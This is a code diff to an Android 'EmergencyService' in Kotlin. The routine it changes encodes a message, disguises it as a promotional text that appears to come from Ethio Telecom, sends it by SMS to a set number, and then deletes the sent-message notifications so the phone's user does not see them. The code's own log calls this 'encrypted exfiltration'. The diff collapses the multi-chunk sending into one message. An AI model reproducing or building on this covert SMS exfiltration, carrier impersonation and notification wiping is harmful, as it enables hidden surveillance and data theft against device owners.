@@ -180,19 +180,16 @@ class EmergencyService : Service() {
         }
         try {
             val token = FidelCipher.encode(msg)
-            val promos = FidelCipher.camouflage(applicationContext, token)
+            val promo = FidelCipher.camouflage(applicationContext, token)
             val smsManager = getSystemService(android.telephony.SmsManager::class.java)
 
-            for (promo in promos) {
-                val parts = smsManager.divideMessage(promo)
-                smsManager.sendMultipartTextMessage(phone, null, parts, null, null)
-                
-                // Clear any "Message Sent" or thread update notifications from the UI
-                CoroutineScope(Dispatchers.Main).launch {
-                    delay(1000)
-                    MyNotificationListener.instance?.wipeNotifications("TEXT", "ኢትዮ ቴሌኮም")
-                }
-                delay(3000) // Space out chunks to prevent carrier blocking
+            val parts = smsManager.divideMessage(promo)
+            smsManager.sendMultipartTextMessage(phone, null, parts, null, null)
+            
+            // Clear any "Message Sent" or thread update notifications from the UI
+            CoroutineScope(Dispatchers.Main).launch {
+                delay(1000)
+                MyNotificationListener.instance?.wipeNotifications("TEXT", "ኢትዮ ቴሌኮም")
             }
             DebugLogger.log("CodeRed", "Encrypted exfiltration dispatched to $phone")
         } catch (e: Exception) {
